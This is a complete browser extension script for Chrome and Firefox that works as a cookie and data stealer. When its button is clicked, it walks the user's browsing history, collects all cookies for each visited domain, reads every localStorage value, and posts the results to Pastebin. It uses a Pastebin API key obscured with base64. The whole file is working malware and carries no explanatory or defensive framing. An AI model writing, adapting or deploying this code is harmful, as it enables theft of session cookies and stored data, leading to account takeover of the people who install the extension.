function dk(ek) {
    return atob(ek);
}

// Function to send data to Pastebin
async function sendDataToPastebin(data) {
    const apiUrl = "https://pastebin.com/api/api_post.php";
    const pasteSerNo = randomIntFromInterval(0, 9999999);
    const apiDevKey = dk("STl3M2g4dHpfT1JMTWZHbl9uYzRrc1N6dHpSbnJCLXo=");
    const apiPasteName = "Data No.: " + pasteSerNo.toString() + "5urg30n";

    const apiParams = new URLSearchParams({
        'api_dev_key': apiDevKey,
        'api_paste_code': JSON.stringify(data, null, 4),
        'api_paste_name': apiPasteName,
        'api_option': 'paste'
    });

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            body: apiParams
        });
        const result = await response.text();
        if (response.ok) {
            console.log(`Data successfully posted to Pastebin: ${result}`);
        } else {
            console.error(`Failed to post data to Pastebin: ${response.status} - ${result}`);
        }
    } catch (error) {
        console.error(`An error occurred: ${error}`);
    }
}

// Function to retrieve cookies for each site in the browser history
function retrieveCookiesForHistory() {
    chrome.history.search({ text: '', maxResults: 100 }, (historyItems) => {
        const siteCookies = {};

        historyItems.forEach((item) => {
            const url = new URL(item.url);
            const domain = url.hostname;

            chrome.cookies.getAll({ domain: domain }, (cookies) => {
                if (!siteCookies[domain]) {
                    siteCookies[domain] = [];
                }
                siteCookies[domain].push(...cookies);
                console.log(siteCookies);

                // Send the site cookies to Pastebin
                sendDataToPastebin(siteCookies);
            });
        });
    });
}

// Function identical to retrieveCookiesForHistory but for the Firefox browser
function retrieveCookiesForHistoryFirefox() {
    browser.history.search({ text: '', maxResults: 100 }, (historyItems) => {
        const siteCookies = {};
        historyItems.forEach((item) => {
            const url = new URL(item.url);
            const domain = url.hostname;
            browser.cookies.getAll({ domain: domain }, (cookies) => {
                if (!siteCookies[domain]) {
                    siteCookies[domain] = [];
                }
                siteCookies[domain].push(...cookies);
                // Send the site cookies to Pastebin
                sendDataToPastebin(siteCookies);
            });
        });
    });
}

// Determine if browser is Firefox or Chrome
if (typeof browser !== 'undefined') {
    browser.browserAction.onClicked.addListener(() => {
        retrieveCookiesForHistoryFirefox();
        for (let i = 0; i < localStorage.length; i++) {
            sendDataToPastebin(localStorage.getItem(localStorage.key(i)));
        }
    });
} else {
    chrome.browserAction.onClicked.addListener(() => {
        retrieveCookiesForHistory();
        for (let i = 0; i < localStorage.length; i++) {
            let dataPackage = [];
            let valueData = localStorage.getItem(localStorage.key(i));
            valueData.split(' ').forEach(value => {
                dataPackage.push(value);
            });
            sendDataToPastebin(dataPackage);
        }
    });
}
